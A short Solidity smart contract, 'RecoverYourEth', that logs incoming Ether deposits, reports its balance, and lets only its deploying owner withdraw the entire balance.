pragma solidity ^0.4.24;

contract RecoverYourEth {

    address public owner;

    event LogReceivedFunds(address sender, uint amount);
    event LogReturnedFunds(address recipient, uint amount);
    event LogReturnedFundsError(address recipient, uint amount);

    constructor() public {
        owner = msg.sender;
    }

    function() public payable {
        emit LogReceivedFunds(msg.sender, msg.value);
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        emit LogReturnedFundsError(msg.sender, address(this).balance);
        _;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function refundBalance() public onlyOwner {
        uint256 balance = address(this).balance;
        emit LogReturnedFunds(msg.sender, balance);
        owner.transfer(balance);
    }
}